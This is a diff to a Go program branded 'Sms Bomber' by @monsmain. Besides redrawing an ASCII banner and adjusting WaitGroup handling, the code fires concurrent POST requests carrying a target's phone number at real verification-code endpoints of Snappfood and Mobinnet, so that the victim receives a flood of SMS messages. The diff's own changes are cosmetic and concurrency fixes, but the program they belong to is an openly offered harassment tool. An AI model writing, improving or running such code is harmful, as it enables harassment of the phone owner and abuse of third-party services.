@@ -29,6 +29,7 @@ func clearScreen() {
 // It uses a context for cancellation, a WaitGroup for synchronization,
 // and a channel to report only the HTTP status code.
 func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
+	// --- CORRECTION: wg.Done() should be deferred here ---
 	defer wg.Done()
 
 	jsonData, err := json.Marshal(payload)
@@ -68,6 +69,7 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 // It uses a context for cancellation, a WaitGroup for synchronization,
 // and a channel to report only the HTTP status code.
 func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
+	// --- CORRECTION: wg.Done() should be deferred here ---
 	defer wg.Done()
 
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
@@ -99,49 +101,49 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 func main() {
 	clearScreen()
 
-	// --- ASCII Banner with Colors (Whitespace removed) ---
+	// --- ASCII Banner with Colors ---
 	fmt.Print("\033[01;32m") // Top (green)
 	fmt.Print(`
-:-.
-.:   =#-:-----:
-  **%@#%@@@#*+==:
-:=*%@@@@@@@@@@@@@@%#*=:
--*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
-.-%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
-.= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
-=%-.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
-:%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
-#@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
-.%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
-`) // Removed empty lines here
+                                :-.                                   
+                         .:   =#-:-----:                              
+                           **%@#%@@@#*+==:                            
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
+`)
 	fmt.Print("\033[01;37m") // Middle (white)
 	fmt.Print(`
-=@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
-+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
-.%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-#@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
--@@@@*:. .- -#@@@@@@#: . . -#@@@%:
-*@@%# . -@@@@@@. #@@@+
-.%@@# @monsmain +@@@@@@= Sms Bomber #@@#
-:@@* =%@@@@@@%- faster *@@:
-#@@% .*@@@@#%@@@%+. %@@+
-%@@@+ -#@@@@@* :%@@@@@*- *@@@*
-`) // Removed empty lines here
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+             *@@%#            -@@@@@@.            #@@@+             
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+              :@@*           =%@@@@@@%-   faster   *@@:              
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
+`)
 	fmt.Print("\033[01;31m") // Bottom (red)
 	fmt.Print(`
-*@@@@#++*#%@@@@@@+ #@@@@@@%#+++%@@@@=
-#@@@@@@@@@@@@@@* Go #@@@@@@@@@@@@@@*
-=%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
-.---@@@@@@@@@%@@@%%@@@@@@@@%:--.
-#@@@@@@@@@@@@@@@@@@@@@@+
-*@@@@@@@@@@@@@@@@@@@@+
-+@@%*@@%@@@%%@%*@@%=
-+%+ %%.+@%:-@* *%-
-. %# .%# %+
-:. %+ :.
--:
-`) // Removed empty lines here
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+                        +@@%*@@%@@@%%@%*@@%=                         
+                         +%+ %%.+@%:-@* *%-                          
+                          .  %# .%#  %+                              
+                             :.  %+  :.                              
+                                 -:                                  
+`)
 	fmt.Print("\033[0m") // Reset color
 	// --- End of ASCII Banner ---
 
@@ -174,6 +176,7 @@ func main() {
 		// Launch Goroutine for Snappfood form request
 		wg.Add(1) // Increment WaitGroup counter
 		go func(p string) { // Pass phone value to Goroutine
+			// defer wg.Done() // --- REMOVED: Moved inside sendFormRequest ---
 			formData := url.Values{}
 			formData.Set("cellphone", p)
 			sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
@@ -182,6 +185,7 @@ func main() {
 		// Launch Goroutine for Mobinnet JSON request
 		wg.Add(1) // Increment WaitGroup counter
 		go func(p string) { // Pass phone value to Goroutine
+			// defer wg.Done() // --- REMOVED: Moved inside sendJSONRequest ---
 			sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
 		}(phone) // Pass the current value of phone to the anonymous function
 	}
@@ -202,4 +206,6 @@ func main() {
 			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended") // Success message format from smstest.go
 		}
 	}
+
+	// The final "All requests processed." message is still omitted to match smstest.go style.
 }
